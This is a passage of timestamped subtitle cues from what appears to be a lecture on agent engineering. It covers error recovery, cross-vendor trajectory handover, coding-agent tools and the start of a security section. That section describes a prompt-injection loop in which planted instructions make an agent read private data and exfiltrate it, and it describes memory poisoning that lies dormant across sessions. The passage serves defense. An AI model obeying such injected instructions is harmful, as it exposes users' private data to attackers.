+The most dangerous failure mode of a streaming connection is not a drop (which immediately produces an error) but a silent stall—the connection remains established, but the data flow stops, like a connected pipe that yields no water.
+
+218
+00:32:28.861 --> 00:32:47.398
+SDK timeouts often cover only the initial connection, not the transfer process, so a production Agent needs an independent idle watchdog (a watchdog timer—if no new output arrives within a set interval, the connection is judged stalled) that kills the hung stream and triggers a retry upon timeout.
+
+219
+00:32:47.398 --> 00:32:54.736
+This generalizes into a principle: every long-lived connection needs a liveness signal, not just a connection timeout.
+
+220
+00:32:54.736 --> 00:33:08.336
+Integrity monitoring targets trajectory structure: when a tool call is found to lack its paired result message, the system repairs the pairing before injecting the context, rather than throwing the structural anomaly at the model or the user.
+
+221
+00:33:08.336 --> 00:33:24.173
+One notable engineering detail: some production Agents run both a production mode and a training-data collection mode—production mode may patch missing messages with placeholders, while training mode refuses to repair, because synthetic placeholders would pollute the training data.
+
+222
+00:33:24.173 --> 00:33:31.998
+This "lenient in production, strict in training" dual standard reflects the deep coupling between the Harness and model training.
+
+223
+00:33:31.998 --> 00:33:36.298
+Recovery: escalate through increasingly visible stages.
+
+224
+00:33:36.298 --> 00:33:43.798
+Recovery measures are graded by how visible they are to the user; if a lower level solves the problem, do not escalate:
+
+225
+00:33:43.798 --> 00:33:45.836
+Silent retry.
+
+226
+00:33:45.836 --> 00:33:49.098
+The default action for retryable errors.
+
+227
+00:33:49.098 --> 00:34:19.261
+Two details determine whether retries succeed: first, use exponential backoff with random jitter to prevent fleets of clients from retrying in lockstep and causing secondary congestion, while honoring the server's suggested wait duration; second, distinguish foreground from background calls—a failed main-loop request is retried, but auxiliary background calls (title generation, input suggestions) are dropped on failure, lest background retries crowd out the main loop's quota and create "retry
+
+228
+00:34:19.261 --> 00:34:21.123
+amplification.
+
+229
+00:34:21.292 --> 00:34:23.404
+Degrade and continue.
+
+230
+00:34:23.354 --> 00:34:27.867
+When retries fail, change the request itself and try again.
+
+231
+00:34:27.867 --> 00:34:41.754
+Take output truncation (generation cut off by the length limit): first silently resend with a raised output cap; if that is still not enough, append a meta-instruction at the end of the message so the model continues generation from the breakpoint.
+
+232
+00:34:41.754 --> 00:34:57.279
+When the primary model is persistently overloaded, fall back to another model, first stripping proprietary formatting blocks from the previous model's history so that the new model can parse it; when a high-cost mode is rate-limited, temporarily fall back to the standard mode.
+
+233
+00:34:57.279 --> 00:34:59.429
+Surface to the user.
+
+234
+00:34:59.429 --> 00:35:06.829
+Only after all automatic means are exhausted is the error presented—together with the recovery actions already attempted.
+
+235
+00:35:06.829 --> 00:35:13.579
+Tool-layer errors take a different path: do not terminate the session; turn the error into the model's input.
+
+236
+00:35:13.579 --> 00:35:29.829
+A hallucinated call receives a structured "no such tool" error result; a validation failure receives an error annotated with hints about the input contract; malformed arguments (a string emitted where an object was expected) are programmatically repaired before execution.
+
+237
+00:35:29.829 --> 00:35:45.579
+These errors enter the context as ordinary tool results, and the model corrects itself on the next turn—an application of the earlier principle that "the more structured the feedback, the better": the more specific the error fed back, the higher the model's self-correction rate.
+
+238
+00:35:45.579 --> 00:35:53.192
+The core principle of this section is: the unit of error handling is not the single request, but the entire recovery loop.
+
+239
+00:35:53.192 --> 00:36:11.329
+Until recovery is confirmed impossible, intermediate errors should not be exposed to consumers—whether the user or downstream systems subscribed to events: withhold error messages during recovery; if recovery succeeds, consumers never notice; only when everything fails are the withheld errors released.
+
+240
+00:36:11.329 --> 00:36:20.204
+This is the engineering realization of Chapter 1's correction principle—"do not expose intermediate states until recovery is confirmed impossible.
+
+241
+00:36:20.204 --> 00:36:24.717
+Handover: passing an unfinished trajectory to another model.
+
+242
+00:36:24.717 --> 00:36:30.217
+When the primary model stays unavailable, another vendor has to finish the trajectory.
+
+243
+00:36:30.217 --> 00:36:37.154
+The real obstacle is not that the endpoint differs, but that part of the trajectory belongs to the original vendor alone.
+
+244
+00:36:37.154 --> 00:36:46.767
+Tool calls and tool results are structured differently across vendors yet carry the same meaning, so re-rendering them is enough; the model's reasoning is the hard part.
+
+245
+00:36:46.767 --> 00:36:55.592
+Reasoning usually consists of two things: readable text, and a credential the vendor attaches to it to prove the reasoning really came from itself.
+
+246
+00:36:55.592 --> 00:37:04.417
+The text is still legible to another model, the credential is worthless there—a cross-vendor handover can carry the text, but not the credential.
+
+247
+00:37:04.417 --> 00:37:08.254
+Vendors do not agree on what they require of a credential.
+
+248
+00:37:08.254 --> 00:37:14.029
+The permissive end validates nothing; the strict end rejects any credential it did not issue.
+
+249
+00:37:14.029 --> 00:37:20.492
+Nor is the credential necessarily attached to the reasoning—it may be attached to the tool call instead.
+
+250
+00:37:20.492 --> 00:37:28.179
+So the seemingly safe policy "just delete all the reasoning and you are fine" is precisely what fails at some vendors.
+
+251
+00:37:28.179 --> 00:37:42.304
+A handover has to be designed for the strictest end, with a fallback for the cases it cannot satisfy: rewrite the historical tool calls as prose, which stops the model from treating them as tools it actually invoked, but at least lets it carry on.
+
+252
+00:37:42.460 --> 00:37:50.547
+This yields a design principle: a trajectory should not be stored in any single vendor's wire format, but kept in a neutral one.
+
+253
+00:37:50.497 --> 00:38:02.585
+Each reasoning segment is split into portable text and a non-portable credential; a tool call records only its name and arguments, and identifiers are regenerated for the target vendor when the request is rendered.
+
+254
+00:38:02.585 --> 00:38:12.385
+On a switch the credential is always discarded and the text is carried across as ordinary content, rather than being pushed back into wherever the target vendor keeps reasoning.
+
+255
+00:38:12.385 --> 00:38:22.122
+The reasoning summary a vendor returns is exactly the portable copy meant for this situation—keep it, and there is no need to call a model again to compress anything.
+
+256
+00:38:22.122 --> 00:38:35.672
+The value of a neutral trajectory is not limited to failover either: the evaluation replays of Chapter 7, the training-sample construction of Chapter 8 and the experience extraction of Chapter 9 all rely on the same artifact.
+
+257
+00:38:35.672 --> 00:38:42.197
+Experiment 5-1 advanced difficulty, three stars: : Cross-Vendor Trajectory Handover
+
+258
+00:38:42.197 --> 00:38:55.485
+Experiment Goal: Verify whether a neutral trajectory format lets a half-finished Agent trajectory be finished by a different vendor's model, and quantify what "verbatim pass-through" and "strip everything" each cost.
+
+259
+00:38:55.485 --> 00:39:09.247
+Technical Approach: Use a task that needs several rounds of tool calls; midway, inject consecutive rate-limit and overload responses for the current vendor, and after the circuit breaker trips, switch to another vendor and continue.
+
+260
+00:39:09.247 --> 00:39:18.785
+Store the trajectory in a neutral format where reasoning is split into portable text and a non-portable credential and a tool call records only its name and arguments.
+
+261
+00:39:18.785 --> 00:39:42.135
+Compare three treatments: pass-through moves the original vendor's messages verbatim into the new vendor's structure; stripping deletes all reasoning and credentials; neutral discards the credential and carries the text, or the reasoning summary the vendor returned, as ordinary content, regenerating identifiers for the target vendor and rewriting historical calls as prose when the receiving side insists on a credential.
+
+262
+00:39:42.135 --> 00:39:47.247
+Pick three vendors whose wire formats differ and switch between each pair.
+
+263
+00:39:47.247 --> 00:39:57.472
+Acceptance Criteria: Retain the raw response of the first request after every switch; a pass-through failure must be the vendor's real error, never a simulated one.
+
+264
+00:39:57.472 --> 00:40:06.660
+Require the neutral treatment to produce no API error on any vendor pair, and record faithfully which pairs the other two fail on and with what error.
+
+265
+00:40:06.660 --> 00:40:18.860
+Compare the three on task completion, on how often the same tool is called again after the switch (fingerprinted by tool name plus arguments), and on the extra rounds and tokens needed to finish after the switch.
+
+266
+00:40:18.860 --> 00:40:24.872
+If the neutral treatment does not beat stripping on redundant calls, record that just as faithfully.
+
+267
+00:40:24.872 --> 00:40:32.435
+Experiment 5-2 intermediate difficulty, two stars: : Continuing After the Output Is Cut Off Halfway
+
+268
+00:40:32.435 --> 00:40:42.635
+Experiment Goal: Compare "resend the whole turn" against "continue from the half-written output as a prefix" in cost, correctness and side effects.
+
+269
+00:40:42.635 --> 00:40:51.360
+Technical Approach: Cut the connection at three points in a streaming response—mid-reasoning, mid-prose, and mid tool-call argument.
+
+270
+00:40:51.360 --> 00:41:12.860
+Three recovery routes: discard the fragment and resend the whole turn; append the fragment as a trailing assistant message and ask the model to continue it (some vendors support this natively, some require the message to be explicitly marked as one awaiting continuation, and those without such an interface fall back to the next route); append a meta-instruction saying to continue from the break.
+
+271
+00:41:12.860 --> 00:41:22.772
+A half-written tool call cannot be sent back in its native structure, so it must be turned into text for the model to complete, then re-parsed and validated after splicing.
+
+272
+00:41:22.772 --> 00:41:31.347
+If a tool was already executed eagerly from the fragment, deduplicate by call fingerprint before continuing to avoid repeating the side effect.
+
+273
+00:41:31.516 --> 00:41:54.691
+Acceptance Criteria: Repeat each of the three break points several times and report, for each route, the recovery rate, the output tokens saved relative to a full resend, the validity and the semantic correctness of the completed arguments (a splice easily adds stray whitespace or duplicated characters, and valid is not the same as correct), and the number of repeated side effects.
+
+274
+00:41:54.641 --> 00:42:01.328
+Also record which break points cannot be reproduced at which vendors, and whether the fallback route works.
+
+275
+00:42:01.328 --> 00:42:05.178
+Termination: every recovery path needs a ceiling.
+
+276
+00:42:05.178 --> 00:42:23.878
+Recovery mechanisms themselves can fail, so every recovery path must have an explicit retry ceiling: context compaction gives up after several consecutive failures; the permission classifier falls back to asking a human after repeated failures; output continuation is attempted at most a fixed number of times.
+
+277
+00:42:23.878 --> 00:42:26.328
+Where do the thresholds come from?
+
+278
+00:42:26.328 --> 00:42:29.166
+Production data, not guesswork.
+
+279
+00:42:29.166 --> 00:42:52.516
+Take Claude Code's compaction circuit breaker: the "3 consecutive failures" threshold comes from real session statistics—one session once failed over three thousand times in a row on this very recovery path, and such futile retries alone wasted about 250,000 API calls per day worldwide; more than a thousand sessions saw streaks of 50+ consecutive failures.
+
+280
+00:42:52.516 --> 00:43:01.791
+Three is the empirical inflection point between "the vast majority of failures recover before this" and "further retries are essentially hopeless.
+
+281
+00:43:01.791 --> 00:43:11.428
+More insidious than a single-point breaker is the death spiral: logic triggered on the error path itself calls the LLM, fails again, and cascades.
+
+282
+00:43:11.428 --> 00:43:29.566
+One real cascade: the Agent stops on a context-overflow error, which fires a stop hook (cleanup logic that runs automatically when the Agent ends) that "commits code on exit," the hook calls the LLM to write a commit message, context overflows again, and the hook fires once more.
+
+283
+00:43:29.566 --> 00:43:44.266
+Defense comes in two parts: disable all model-invoking side effects on the error path (better to lose an auxiliary feature once, such as automatic memory extraction), and use a recursion-depth counter to detect and break any residual cascade.
+
+284
+00:43:44.266 --> 00:43:58.366
+Finally, above all automatic mechanisms sit global termination and escalation conditions: a maximum number of turns, a session budget cap, and escalation to human intervention when consecutive failures exceed their threshold.
+
+285
+00:43:58.366 --> 00:44:01.553
+Implementation Tips for Coding Agents.
+
+286
+00:44:01.553 --> 00:44:04.803
+The workflow described above is the ideal.
+
+287
+00:44:04.803 --> 00:44:15.141
+Making it run in practice takes a handful of concrete implementation techniques—ways to raise response speed and cut context consumption without degrading the quality of thought.
+
+288
+00:44:15.141 --> 00:44:21.103
+They are the general Agent techniques of Chapters 2 and 4, applied to the programming domain.
+
+289
+00:44:21.103 --> 00:44:26.153
+Parallel Tool Calls, Streaming Execution, and Cascading Abort.
+
+290
+00:44:26.153 --> 00:44:34.916
+Traditional Agent implementations often work serially: generate a tool call, execute it, get the result, then decide the next step.
+
+291
+00:44:34.916 --> 00:44:38.441
+This strict queuing wastes a great deal of time.
+
+292
+00:44:38.596 --> 00:44:56.896
+Modern Coding Agents should fully leverage streaming responses: Chapter 2 introduced this mechanism when discussing model output order—once the parameters of the first tool call are fully generated and pass validation, execution can begin immediately, without waiting for the model to generate subsequent tool calls.
+
+293
+00:44:56.846 --> 00:45:13.408
+For example, if the model needs to output three tool calls in one inference—search code, check configuration files, and read logs—the first call can start executing as soon as its parameters are complete and validated, overlapping with the generation of the other two.
+
+294
+00:45:13.408 --> 00:45:18.208
+Independent calls can also be executed in parallel rather than queued.
+
+295
+00:45:18.208 --> 00:45:25.421
+This overlapping execution significantly reduces end-to-end latency, making the Agent's responses more agile.
+
+296
+00:45:25.421 --> 00:45:29.333
+The flip side of parallel execution is fault handling.
+
+297
+00:45:29.333 --> 00:45:36.233
+Each tool definition should declare whether it supports concurrent execution (default is no, fail-safe).
+
+298
+00:45:36.233 --> 00:45:53.108
+When a call fails, a cascading abort mechanism terminates other calls started in the same batch that depend on its result, but does not affect independent calls or the parent operation—this is a concrete implementation of the "fault boundary control" principle from the Harness engineering section.
+
+299
+00:45:53.108 --> 00:45:55.958
+Fine-Grained Context Management.
+
+300
+00:45:55.958 --> 00:46:03.471
+The fundamental challenge for Coding Agents is that codebases are usually large, but the model's context window is limited.
+
+301
+00:46:03.471 --> 00:46:12.308
+Even if advanced models claim to support millions of tokens, stuffing the entire codebase into the context is neither economical nor necessary.
+
+302
+00:46:12.308 --> 00:46:16.996
+Intelligent context management needs to operate at multiple levels.
+
+303
+00:46:16.996 --> 00:46:22.171
+At the file reading level, the Agent should not always read the entire file.
+
+304
+00:46:22.171 --> 00:46:33.758
+For large files, the tool should support reading specific line ranges—for example, only reading lines 100 to 150, rather than loading a file with thousands of lines.
+
+305
+00:46:33.758 --> 00:46:41.858
+More importantly, when returning content, line numbers should be attached—each line of code is prefixed with its actual line number.
+
+306
+00:46:41.858 --> 00:46:55.183
+This seemingly simple design brings great value: the model can precisely reference "line 42 of src/main.py," reducing ambiguity and making subsequent edit operations more reliable.
+
+307
+00:46:55.183 --> 00:47:00.696
+At the command execution level, handling terminal output also requires care.
+
+308
+00:47:00.696 --> 00:47:05.033
+Compilation or testing can produce thousands of lines of output.
+
+309
+00:47:05.033 --> 00:47:10.246
+If all of it is injected into the context, the budget is quickly exhausted.
+
+310
+00:47:10.246 --> 00:47:31.746
+The long output truncation and persistence mechanism introduced in Chapter 4 is widely applied here: retain the first few lines of output (usually containing error context) and the last few lines (usually containing error summaries), replace the middle with a one-line placeholder, and note that the complete output has been saved to a temporary file for on-demand viewing.
+
+311
+00:47:31.746 --> 00:47:35.071
+Dynamic Injection of Environment Information.
+
+312
+00:47:35.071 --> 00:47:41.408
+This is a practical application of the Agent status bar technique from Chapter 2 to Coding Agents.
+
+313
+00:47:41.408 --> 00:47:47.633
+Unlike general Agents, Coding Agents are highly dependent on the state of the execution environment.
+
+314
+00:47:47.633 --> 00:47:55.971
+Before each inference, the following key environment information should be injected at the end of the context in the form of an Agent status bar:
+
+315
+00:47:55.971 --> 00:48:00.496
+Current working directory: ensures path references are correct
+
+316
+00:48:00.496 --> 00:48:05.433
+Git branch: knows whether working on the main branch or a feature branch
+
+317
+00:48:05.433 --> 00:48:09.658
+Recent commit history: understands the project's evolution
+
+318
+00:48:09.658 --> 00:48:15.521
+Overview of unstaged and staged changes: knows what modifications have been made
+
+319
+00:48:15.521 --> 00:48:27.046
+This information should not be hardcoded into static system prompts—that would destroy KV Cache efficiency—but should be dynamically generated and injected as an appended Agent status bar.
+
+320
+00:48:27.046 --> 00:48:37.033
+In this way, the Agent gains "environmental awareness," with each decision based on an accurate understanding of the current state, rather than outdated assumptions.
+
+321
+00:48:37.033 --> 00:48:40.896
+State Persistence in the Command Execution Environment.
+
+322
+00:48:41.044 --> 00:48:53.019
+When interacting with code, many operations depend on environment state: changing directories, activating virtual environments, setting environment variables, starting background services.
+
+323
+00:48:52.969 --> 00:49:07.056
+If each command is executed in a fresh shell, all this state is lost—the Agent just used cd to navigate to the project directory, but the next command starts again in the shell's default directory, forcing it to repeat the same setup.
+
+324
+00:49:07.056 --> 00:49:17.444
+Worse, the effects of some operations (like activating a Python virtual environment) are only valid within the current shell session and cannot be passed across sessions.
+
+325
+00:49:17.444 --> 00:49:25.769
+Therefore, a persistent terminal session should be maintained, created when the Agent starts and kept active throughout the entire interaction.
+
+326
+00:49:25.769 --> 00:49:33.656
+Each command is executed in this shared terminal, preserving the working directory, environment variables, and session state.
+
+327
+00:49:33.656 --> 00:49:40.794
+This design is more aligned with the work habits of human developers—we usually work in a long-running terminal window.
+
+328
+00:49:40.794 --> 00:49:50.381
+Of course, the Agent should also retain the ability to start isolated terminals to support parallel tasks, but the persistent session should be the default mode.
+
+329
+00:49:50.381 --> 00:49:53.481
+Instant Syntax Feedback Mechanism.
+
+330
+00:49:53.481 --> 00:49:58.381
+This once again demonstrates the value of the Agent status bar technique.
+
+331
+00:49:58.381 --> 00:50:05.844
+After the Agent modifies code, it should not wait for the user to explicitly request testing before checking syntax.
+
+332
+00:50:05.844 --> 00:50:18.019
+A more efficient approach is for the tool layer to run the corresponding linter or syntax checker automatically as soon as the file write operation is complete and present the results as part of the tool's return value to the Agent.
+
+333
+00:50:18.019 --> 00:50:29.081
+If a syntax error is detected, the Agent sees the detailed error information immediately in the next inference round—much as an IDE immediately flags an unmatched parenthesis.
+
+334
+00:50:29.081 --> 00:50:40.831
+This instant feedback mechanism significantly reduces the cost of error fixing, because the Agent can correct the error at the moment it is introduced, without waiting until running tests to discover the problem.
+
+335
+00:50:40.831 --> 00:50:54.606
+These five implementation techniques—parallelism and streaming, context management, environmental awareness, state persistence, and instant feedback—together form the technical foundation of an efficient Coding Agent.
+
+336
+00:50:54.606 --> 00:51:06.344
+They are not isolated optimization points, but mutually reinforcing design decisions, all pointing toward a single goal: enabling the Agent to work as smoothly as an experienced developer.
+
+337
+00:51:06.344 --> 00:51:09.194
+Search Tools in Coding Agents.
+
+338
+00:51:09.194 --> 00:51:14.906
+Locating relevant code in a large codebase is the starting point for a Coding Agent's work.
+
+339
+00:51:14.906 --> 00:51:24.819
+Figure 5-3 compares several complementary search tools, illustrating how a mature Coding Agent should choose retrieval methods based on the nature of the task.
+
+340
+00:51:24.819 --> 00:51:30.831
+As illustrated in Figure 5-3: Comparison of Coding Agent Search Tools.
+
+341
+00:51:30.831 --> 00:51:39.731
+Regex Content Matching (grep/ripgrep): The most traditional search method, scanning file contents line by line for pattern matches.
+
+342
+00:51:39.731 --> 00:51:49.344
+When the Agent knows the exact text to find (function names, variable names, error messages), it can locate every occurrence quickly and accurately.
+
+343
+00:51:49.344 --> 00:51:57.656
+The expressive power of regular expressions (a syntax for describing text patterns with special symbols, e.g., def handle.
+
+344
+00:51:57.656 --> 00:52:07.431
+matches all function definitions starting with handle) captures complex patterns—not just literal text, but code that conforms to a particular structure.
+
+345
+00:52:07.431 --> 00:52:18.606
+In practice, file type filtering (search only Python files) and path pattern filtering (exclude test directories) should also be supported to reduce noise.
+
+346
+00:52:18.606 --> 00:52:32.944
+The fundamental limitation: it finds only textual matches and understands no semantics—a search for "user authentication" will never surface a function that handles login logic but happens not to contain the word "authentication.
+
+347
+00:52:33.100 --> 00:52:41.562
+Filename Pattern Matching (glob): Ignores file content, only searches the file system's path structure for files matching a pattern.
+
+348
+00:52:41.512 --> 00:52:56.100
+For example, /.test.ts recursively finds all TypeScript test files, src/components//Button.tsx searches for Button.tsx at any depth under components.
+
+349
+00:52:56.100 --> 00:53:09.787
+It is much faster than content search (no need to open and read files) and is the Agent's first step in exploring the project structure—quickly establishing the project's organizational framework by scanning the entire file system.
+
+350
+00:53:09.787 --> 00:53:18.350
+Semantic Code Search: Unlike the first two exact matching methods, it attempts to understand the "meaning" of the query and the code.
+
+351
+00:53:18.350 --> 00:53:21.312
+It needs to solve two key problems:
+
+352
+00:53:21.312 --> 00:53:33.700
+Structure-Aware Chunking: Code has strict syntactic structure and should be split by complete semantic units like functions, classes, and methods, rather than blindly cutting by a fixed number of characters.
+
+353
+00:53:33.700 --> 00:53:54.262
+Hybrid Retrieval (Chapter 3 details this technology stack): Vector embeddings (dense embeddings) excel at finding semantically similar code with different wording (e.g., searching for "verify user identity" can find a function named check_credentials), while keyword matching excels at precisely matching function and variable names.
+
+354
+00:53:54.262 --> 00:54:05.625
+The two run in parallel, and the results are merged and sorted by a reranker (a cross-encoder that performs fine-grained relevance ranking on candidate results), providing complementary coverage.
+
+355
+00:54:05.625 --> 00:54:17.950
+Semantic search is particularly suitable for exploratory tasks, such as finding code related to "interacting with the database" or "handling user input validation" in an unfamiliar codebase.
+
+356
+00:54:17.950 --> 00:54:24.900
+However, there is a clear debate in the industry about whether it is worth building embedding indices for semantic search.
+
+357
+00:54:24.900 --> 00:54:40.675
+Terminal-based Agents like Claude Code deliberately do not build embedding indices, relying purely on agentic grep + glob for on-the-fly retrieval—this avoids maintaining indices that become stale as the code evolves, eliminates the entire indexing infrastructure.
+
+358
+00:54:40.675 --> 00:54:55.900
+IDE-based tools like Cursor initially took the opposite approach: they are willing to pay the cost of building indices for cross-file semantic recall, using embedding indices to quickly find semantically related but differently worded snippets in large codebases.
+
+359
+00:54:55.900 --> 00:55:01.837
+Today, IDEs like Cursor have also switched to on-the-fly grep + glob retrieval.
+
+360
+00:55:01.837 --> 00:55:25.050
+Symbol-Level Definition and Reference Lookup: This method uses IDE-like "go to definition" and "find all references" capabilities to distinguish symbol definitions from references—for example, it identifies authenticate on line 42 as a function definition and the occurrence on line 189 as a call, whereas text search can only find all lines containing that string.
+
+361
+00:55:25.050 --> 00:55:29.200
+Mainstream coding agents do not currently use this approach.
+
+362
+00:55:29.200 --> 00:55:50.262
+These four search methods form a complementary toolbox, often used in combination in practice: first use semantic search to find relevant modules, then use regex matching to precisely locate specific lines of code, and finally use symbol search to trace the call chain—a progressive strategy "from coarse to fine, from semantics to syntax.
+
+363
+00:55:50.262 --> 00:55:53.550
+File Editing Tools in Coding Agents.
+
+364
+00:55:53.550 --> 00:56:03.900
+The difficulty of file editing lies not in the operation itself, but in how to efficiently and reliably tell the system "what to change and how to change it" using an LLM.
+
+365
+00:56:03.900 --> 00:56:13.462
+Figure 5-4 compares five file editing schemes, illustrating the fundamental tension between human language expression and machine-precise execution.
+
+366
+00:56:13.462 --> 00:56:19.487
+As illustrated in Figure 5-4: Comparison of Five File Editing Schemes.
+
+367
+00:56:19.636 --> 00:56:43.873
+Diff Description + Apply Model: The model does not directly specify how to edit the file; instead, it generates a change description—which can be a diff text similar to git diff (the format output by the git diff command, showing "which lines were deleted and which were added"), or a code skeleton with omission markers (using comments like "remain unchanged here" to skip unmodified parts).
+
+368
+00:56:43.823 --> 00:56:55.698
+This description is then handed to a specialized "Apply Model"—usually another, smaller, faster LLM—responsible for merging it with the original file to produce the complete new file.
+
+369
+00:56:55.698 --> 00:57:04.436
+This separation of concerns allows the main model to focus on high-level code logic and the apply model to focus on low-level text operations.
+
+370
+00:57:04.436 --> 00:57:20.961
+The fragility of a naive implementation lies in the merge step: when there are minor discrepancies between the change description and the actual file code, it needs to determine if they refer to the same location; when there are multiple similar code snippets, it might merge into the wrong place.
+
+371
+00:57:20.961 --> 00:57:45.848
+Cursor is a representative of the continuous evolution of this approach: the main model outputs a code skeleton with omission markers, a specially trained fast-apply small model rewrites the complete file, and speculative decoding (using the original file content as a draft for parallel verification) pushes the merge speed to thousands of tokens per second—engineering investment has bought reliability and speed for this approach.
+
+372
+00:57:45.848 --> 00:57:50.298
+Old String → New String: The approach adopted by Claude Code.
+
+373
+00:57:50.298 --> 00:58:00.798
+The model provides an old string (the original text to be replaced) and a new string (the replacement text), and the framework performs a simple string find-and-replace.
+
+374
+00:58:00.798 --> 00:58:10.411
+The advantage is predictability and transparency—if the old string exists and is unique in the file, it succeeds; otherwise, it fails.
+
+375
+00:58:10.411 --> 00:58:12.698
+There is no ambiguity.
+
+376
+00:58:12.698 --> 00:58:22.073
+The cost is that deleting large blocks of code requires outputting all the original content in full; a single character deviation causes the match to fail.
+
+377
+00:58:22.073 --> 00:58:28.286
+When the same code appears multiple times, a longer context must be provided to disambiguate.
+
+378
+00:58:28.286 --> 00:58:36.398
+Line Number Targeting (Old Line Numbers → New String): The model specifies "delete lines X to Y, insert new content.
+
+379
+00:58:36.398 --> 00:58:42.923
+If the file-reading tool includes line numbers, the model can identify the exact range to replace.
+
+380
+00:58:42.923 --> 00:58:47.773
+Deleting a large block requires only its starting and ending line numbers.
+
+381
+00:58:47.773 --> 00:58:51.723
+However, each edit shifts the line numbers that follow it.
+
+382
+00:58:51.723 --> 00:59:00.298
+When the model proposes several edits at once, all edits should refer to the original line numbers, as in a diff, to avoid confusion.
+
+383
+00:59:00.460 --> 00:59:09.022
+Vim-like Edit Commands: Borrowing from the Vim editor's command system, supporting rich operations like copy, cut, and paste.
+
+384
+00:59:08.972 --> 00:59:14.422
+Very efficient for restructuring code (moving a function from one place to another).
+
+385
+00:59:14.422 --> 00:59:23.210
+But the command syntax carries a real learning burden: the strongest models handle it well, while smaller models make noticeably more mistakes.
+
+386
+00:59:23.210 --> 00:59:37.197
+This approach is also unfriendly to a model that emits several edit commands from a single round of thinking, because after each Vim edit the file content and the line numbers change, and the model can hardly compute the post-edit line numbers in advance.
+
+387
+00:59:37.197 --> 00:59:48.947
+A deeper thought: editors like Vim were designed for humans, and a human needs to keep seeing the current state and then plan one simple next operation (write a line of code, delete a few lines).
+
+388
+00:59:48.947 --> 00:59:58.747
+But today a model works by thinking for a fairly long stretch and then performing a batch of rather complex operations (writing several hundred lines of code at once).
+
+389
+00:59:58.747 --> 01:00:07.322
+String Start + End Matching (Old String Start + End → New String): This can be seen as an improvement over the old string replacement scheme.
+
+390
+01:00:07.322 --> 01:00:17.135
+The model does not need to output the complete old string; it only needs to provide the first few lines and the last few lines of the content to be deleted, omitting the middle part.
+
+391
+01:00:17.135 --> 01:00:24.647
+The framework locates the replacement area from this start-and-end pair, provided that the combination is unique within the file.
+
+392
+01:00:24.647 --> 01:00:38.360
+This scheme combines the reliability of text replacement with the efficiency of the line number approach—when deleting large blocks of code, there is no need to output hundreds of lines of original code, only the boundaries need to be shown.
+
+393
+01:00:38.360 --> 01:00:47.560
+At the same time, because it is still based on content matching rather than abstract line numbers, the risk of the model making errors is relatively low.
+
+394
+01:00:47.560 --> 01:00:50.222
+Security for Coding Agents.
+
+395
+01:00:50.222 --> 01:01:20.397
+This section organizes the Coding Agent's defenses into a coherent framework: we first outline the threat model—which risks are most lethal; then isolation as the safety net—network egress, file system, and resource limits in the sandbox; then execution-time defense—semantic parsing of commands, and speculative execution that makes security checks "invisible"; and finally trust and loyalty—whom the Agent serves under multi-party delegation, and how to move the trust boundary down to the data
+
+396
+01:01:20.397 --> 01:01:24.247
+layer when AI-written code itself cannot be trusted.
+
+397
+01:01:24.247 --> 01:01:33.560
+The threat model, loyalty, and trust-boundary discussions apply to all Agents; sandboxing and command parsing are specific to Coding Agents.
+
+398
+01:01:33.560 --> 01:01:39.260
+This "sovereign Agent" paradigm also introduces severe security challenges.
+
+399
+01:01:39.260 --> 01:01:50.835
+A Coding Agent has permissions to read and write files, execute commands, and access networks, meaning that once injected with malicious instructions, it could cause irreversible damage.
+
+400
+01:01:50.835 --> 01:02:03.272
+Developer and independent researcher Simon Willison summarized this risk with his famous "Lethal Triad"—when all three elements are present, they form a complete attack loop, putting the system at high risk:
+
+401
+01:02:03.272 --> 01:02:08.922
+Access to Private Data — The Agent can read user files and password managers.
+
+402
+01:02:08.922 --> 01:02:15.697
+Exposure to Untrusted Content — Processed emails and web pages may contain malicious payloads.
+
+403
+01:02:15.697 --> 01:02:21.222
+Ability to Communicate Externally — It can send emails and execute commands.
+
+404
+01:02:21.222 --> 01:02:31.885
+This closes the attack loop: malicious instructions hidden in untrusted content enter the Agent, drive it to read private data, and then exfiltrate it through external channels.
+
+405
+01:02:31.885 --> 01:02:38.435
+Note that the presence of all three elements is dangerous enough on its own, without any additional conditions.
+
+406
+01:02:38.435 --> 01:02:43.435
+Building on this, the author adds a fourth dimension—Persistent Memory.
+
+407
+01:02:43.435 --> 01:03:02.785
+This is not a parallel fourth necessary condition, but an amplifier for attacks: an attacker can write seemingly harmless biases or malicious instructions into the Agent's long-term memory, where they lie dormant across sessions and trigger at an opportune moment — turning a one-off attack into a threat that lies in wait and compounds over time.
+
+408
+01:03:02.956 --> 01:03:13.081
+These four points can be summarized as four types of boundaries: data boundary, input trust boundary, output impact boundary, and cross-session boundary.
+
+409
+01:03:13.031 --> 01:03:22.293
+A full-permission local Agent like OpenClaw spans all four risk dimensions, making security protection a core challenge that such Agents must confront.
+
+410
+01:03:22.293 --> 01:03:41.743
+This also explains why closed-source commercial Agents (like Claude Cowork (Anthropic's general-purpose Agent for knowledge work, reusing Claude Code's agentic architecture, capable of reading and writing local files and completing multi-step tasks across multiple office applications)) have chosen conservative permission strategies.
+
+411
+01:03:41.743 --> 01:03:46.368
+Against prompt injection, input filtering alone barely helps.
+
+412
+01:03:46.368 --> 01:03:54.418
+The goal is not to recognize every attack, but to ensure that an injected Agent never gets the chance to carry a dangerous action through.
+
+413
+01:03:54.418 --> 01:03:59.318
+This is exactly where the three-layer guardrails from Chapter 1 come into play.
+
+414
+01:03:59.318 --> 01:04:04.243
+Compared with other Agents, Coding Agents need to pay special attention to:
+
+415
+01:04:04.243 --> 01:04:16.631
+Command Semantic Parsing — The combinatorial explosion of Shell commands makes keyword blacklists useless; the real effect of a command must be understood at the semantic level (expanded later in this section)
+
+416
+01:04:16.631 --> 01:04:29.243
+Sandbox Isolation and Network Egress Control — Code execution is an attack surface unique to Coding Agents; the engineering choices for isolation levels and egress strategies are covered later in this section;
+
+417
+01:04:29.243 --> 01:04:45.768
+Cross-Session Defense for Persistent Memory — This chapter extends the Lethal Triad analysis to persistent memory: content written to long-term memory must undergo the same trust review as external input so that malicious instructions cannot lie dormant in MEMORY.md and take effect later.
+
+418
+01:04:45.768 --> 01:04:55.481
+These three protections fall into the verification, execution, and data layers respectively, complementing the defense system from the previous two chapters.
+
+419
+01:04:55.481 --> 01:05:01.693
+These strategies cannot completely eliminate risk, but they can reduce the Agent's attack surface.
+
+420
+01:05:01.693 --> 01:05:07.543
+Isolation as the Safety Net: Engineering Choices for the Code Execution Sandbox.
+
+421
+01:05:07.543 --> 01:05:09.943
+Network egress control.
+
+422
+01:05:09.943 --> 01:05:24.631
